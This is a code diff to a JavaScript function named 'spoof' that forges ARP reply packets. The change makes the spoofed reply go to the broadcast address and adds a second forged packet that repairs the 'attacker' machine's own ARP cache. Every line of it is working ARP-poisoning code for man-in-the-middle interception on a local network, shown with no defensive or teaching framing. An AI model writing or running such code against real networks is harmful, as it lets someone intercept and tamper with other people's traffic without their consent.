@@ -79,14 +79,26 @@ var spoof = function (src, dst, mac) {
 
   packet.arp.operation.writeUIntBE(OPERATION.REPLY, 0, 2);
 
-  setMac(packet.arp.dst_mac, dst.mac);
-  setMac(packet.eth.dst_mac, dst.mac);
+  setMac(packet.arp.dst_mac, "FF-FF-FF-FF-FF-FF");
+  setMac(packet.eth.dst_mac, "FF-FF-FF-FF-FF-FF");
 
   setMac(packet.arp.src_mac, mac);
   setMac(packet.eth.src_mac, mac);
 
   setIP(packet.arp.src_ip, src.ip);
   setIP(packet.arp.dst_ip, dst.ip);
+
+  send(packet.buffer);
+
+
+  // Fix our own ARP stack
+  setMac(packet.arp.dst_mac, attacker.mac);
+  setMac(packet.eth.dst_mac, attacker.mac);
+  setIP(packet.arp.dst_ip, attacker.ip);
+
+  setMac(packet.eth.src_mac, dst.mac);
+  setMac(packet.arp.src_mac, dst.mac);
+  setIP(packet.arp.src_ip, dst.ip);
 
   send(packet.buffer);
 };
